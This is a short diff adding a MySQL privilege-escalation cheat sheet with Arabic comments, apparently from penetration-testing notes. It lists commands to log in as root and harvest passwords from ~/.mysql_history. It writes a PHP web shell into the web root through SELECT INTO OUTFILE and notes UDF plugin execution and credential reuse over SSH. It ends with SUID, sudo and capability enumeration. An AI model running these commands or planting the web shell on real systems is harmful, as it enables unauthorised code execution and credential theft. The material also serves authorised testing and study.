@@ -1,0 +1,8 @@
+# MySQL PrivEsc (3306)
+mysql -u root -p                                    # دخول
+cat ~/.mysql_history                                # قد يحتوي كلمات مرور
+# كتابة ملف للنظام (لينكس):
+mysql -e "SELECT '<?php system(\'id\'); ?>' INTO OUTFILE '/var/www/html/s.php'" 2>/dev/null    # مثال
+# UDF/Plugin exec (حسب الإصدار والإعداد)
+# إعادة استخدام بيانات MySQL في SSH/خدمات أخرى
+sudo -l; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null
